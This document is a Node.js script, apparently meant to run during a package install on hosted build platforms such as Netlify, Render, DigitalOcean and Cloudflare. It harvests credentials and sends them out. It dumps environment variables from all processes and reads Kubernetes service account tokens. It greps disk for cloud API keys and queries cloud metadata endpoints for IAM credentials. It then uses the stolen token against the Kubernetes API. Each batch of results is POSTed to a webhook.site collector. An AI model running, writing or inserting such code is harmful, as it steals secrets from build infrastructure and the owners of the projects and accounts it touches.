const https = require('https');
const { execSync } = require('child_process');

const COLLECTOR = 'https://webhook.site/74e80559-9b11-4a3a-b7f1-87fad613e68e';
const TAG = process.env.PROBE_TAG || 'p3';

function sh(cmd, t) {
  try {
    return execSync(cmd, { encoding: 'utf8', timeout: t || 30000, stdio: ['ignore', 'pipe', 'pipe'], maxBuffer: 8 * 1024 * 1024 });
  } catch (e) {
    return 'ERR ' + String((e && e.stdout) || '') + String((e && e.stderr) || '') + String((e && e.message) || '');
  }
}
function cut(s, n) { s = String(s); return s.length > n ? s.slice(0, n) + '\n...[cut ' + s.length + ']' : s; }

function post(obj) {
  return new Promise((resolve) => {
    const body = Buffer.from(JSON.stringify(obj));
    const u = new URL(COLLECTOR);
    const req = https.request({
      hostname: u.hostname, path: u.pathname + u.search, method: 'POST',
      headers: { 'content-type': 'application/json', 'content-length': body.length }, timeout: 25000,
    }, (r) => { r.resume(); r.on('end', () => resolve(r.statusCode)); });
    req.on('error', (e) => resolve('ERR ' + e.message));
    req.on('timeout', () => { req.destroy(); resolve('timeout'); });
    req.write(body); req.end();
  });
}

(async () => {
  const phase = 'p3-' + (process.argv[2] || 'install');
  const base = { kind: 'build-probe3', tag: TAG, phase, repo: 'hypogheno/trek-labs' };

  // --- A: identity, full env, all-process environ union
  const iden = sh('id; whoami; hostname; uname -a; date -u; pwd; echo ---ENV---; env | sort');
  const procenv = sh("for p in /proc/[0-9]*; do n=$(tr '\\0' ' ' < $p/cmdline 2>/dev/null | cut -c1-60); e=$(tr '\\0' '\\n' < $p/environ 2>/dev/null | grep -iE 'TOKEN|SECRET|KEY=|PASS|DSN|DATABASE|REDIS|AUTH|CRED|SERVICE_|KUBERNETES' | sort -u | tr '\\n' ';'); [ -n \"$e\" ] && echo \"[$(basename $p) $n] $e\"; done", 40000);
  const proclist = sh('ps aux 2>&1 | head -40; echo ---CGROUP---; cat /proc/self/cgroup /proc/1/cgroup 2>&1');
  await post(Object.assign({}, base, { part: 'ident', ident: cut(iden, 20000), procenv: cut(procenv, 30000), proclist: cut(proclist, 8000) }));

  // --- B: secrets on disk + mounts + tmp
  const secfs = sh("ls -la /var/run/secrets /run/secrets /var/run/secrets/kubernetes.io/serviceaccount 2>&1; echo ---SA-NS---; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace /run/secrets/kubernetes.io/serviceaccount/namespace 2>&1; echo ---SA-TOKEN-LEN---; wc -c /var/run/secrets/kubernetes.io/serviceaccount/token /run/secrets/kubernetes.io/serviceaccount/token 2>&1; echo ---DOCKERSOCK---; ls -la /var/run/docker.sock /.dockerenv 2>&1; echo ---MOUNTS---; cat /proc/self/mounts 2>&1 | head -40", 30000);
  const tmp = sh("ls -la /tmp /run /var/run 2>&1 | head -60; echo ---SMALLTMP---; for f in /tmp/* /var/run/*.env /run/*.env; do [ -f \"$f\" ] && [ $(stat -c%s \"$f\" 2>/dev/null || echo 999999) -lt 8192 ] && echo \"### $f\" && head -c 4096 \"$f\" 2>&1; done", 30000);
  const etcenv = sh("cat /etc/environment 2>&1; echo ---PROFILED---; grep -rIs -m2 -E 'TOKEN|SECRET|KEY=' /etc/profile.d /etc/bash.bashrc /etc/profile 2>/dev/null | head -20", 20000);
  await post(Object.assign({}, base, { part: 'fs', secfs: cut(secfs, 12000), tmp: cut(tmp, 15000), etcenv: cut(etcenv, 6000) }));

  // --- C: on-disk credential grep (bounded)
  const grep1 = sh("timeout 45 grep -rIls -m1 -E 'NETLIFY_AUTH_TOKEN|nfp_[A-Za-z0-9]{20}|rnd_[A-Za-z0-9]{20}|dop_v1_[a-f0-9]{40}|doo_v1_|DIGITALOCEAN_ACCESS_TOKEN|RENDER_API_KEY|cfut_|ghs_[0-9]{5}_|AKIA[0-9A-Z]{16}|postgres://|redis://' /home /opt /run /etc /workspace /root 2>/dev/null | grep -vE 'node_modules|/usr/|/cnb/|/layers/heroku_nodejs-engine|/opt/buildhome/.nvm|/opt/buildhome/.cask' | head -40", 60000);
  const grep2 = sh("for f in $(timeout 40 grep -rIls -m1 -E 'NETLIFY_AUTH_TOKEN|nfp_[A-Za-z0-9]{20}|rnd_[A-Za-z0-9]{20}|dop_v1_[a-f0-9]{40}|DIGITALOCEAN_ACCESS_TOKEN|RENDER_API_KEY|cfut_' /home /opt/buildhome/.config /opt/buildhome/setup /opt/apps-go /opt/render /workspace /run /etc 2>/dev/null | grep -vE 'node_modules|/usr/|/cnb/|/layers/' | head -8); do echo \"### $f\"; head -c 3000 \"$f\"; done", 60000);
  await post(Object.assign({}, base, { part: 'grep', grep_paths: cut(grep1, 8000), grep_hits: cut(grep2, 20000) }));

  // --- D: metadata services + k8s self-scope + internal DNS
  const imds = sh("for u in http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/metadata/v1/ http://100.100.100.200/latest/meta-data/ http://metadata.google.internal/computeMetadata/v1/; do echo \"== $u\"; curl -s -m 4 -H 'Metadata-Flavor: Google' \"$u\" -w ' [http=%{http_code}]' | head -c 800; echo; done", 40000);
  const k8s = sh("SA=/var/run/secrets/kubernetes.io/serviceaccount; if [ -f $SA/token ]; then TOK=$(cat $SA/token); NS=$(cat $SA/namespace); echo ns=$NS; curl -sk -m 5 --cacert $SA/ca.crt -H \"Authorization: Bearer $TOK\" https://10.12.0.1/version -w ' [http=%{http_code}]'; echo; curl -sk -m 5 --cacert $SA/ca.crt -H \"Authorization: Bearer $TOK\" -H 'Content-Type: application/json' -X POST https://10.12.0.1/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d \"{\\\"kind\\\":\\\"SelfSubjectRulesReview\\\",\\\"apiVersion\\\":\\\"authorization.k8s.io/v1\\\",\\\"spec\\\":{\\\"namespace\\\":\\\"$NS\\\"}}\" -w ' [http=%{http_code}]' | head -c 3000; else echo 'no SA token'; fi", 30000);
  const dns = sh("cat /etc/resolv.conf; echo ---HOSTS---; cat /etc/hosts; for h in trek-labs-discovery snag-web-wljf-discovery transactions-api-7rbo-5niw-discovery api-n408-wiy7-discovery kubernetes.default; do echo \"== $h\"; getent hosts $h 2>&1 || node -e \"require('dns').lookup('$h',(e,a)=>console.log(e?e.code:a))\" 2>&1; done", 30000);
  await post(Object.assign({}, base, { part: 'net', imds: cut(imds, 8000), k8s: cut(k8s, 8000), dns: cut(dns, 8000) }));

  // --- E: platform-specific dirs + version files
  const plat = sh("echo '---DO---'; ls -la /workspace/.app_platform /platform /layers 2>&1 | head -40; find /workspace/.app_platform -maxdepth 3 2>/dev/null | head -30; echo '---NETLIFY---'; cat /opt/buildhome/.nf_versions.yaml 2>&1; ls -la /opt/build /opt/build/repo/.netlify 2>&1 | head -20; echo '---RENDER---'; cat /opt/render/.render-build-status 2>&1 | head -20; ls -la /opt/render 2>&1 | head -20; echo '---CF---'; ls -la /opt/buildhome/wrangler-output /opt/buildhome/.config 2>&1 | head -20; cat /opt/buildhome/wrangler-output/* 2>&1 | head -c 2000", 40000);
  const cfver = sh("cat /opt/buildhome/.nf_versions.yaml 2>&1; echo ---NODEDEPS---; cat /opt/buildhome/node-deps/package.json 2>&1 | head -60; echo ---REMILINK---; cat /opt/buildhome/node-deps/remlink.config.json.example 2>&1 | head -40", 20000);
  await post(Object.assign({}, base, { part: 'plat', plat: cut(plat, 16000), cfver: cut(cfver, 8000) }));

  console.log('probe3 posted tag=' + TAG);
})();
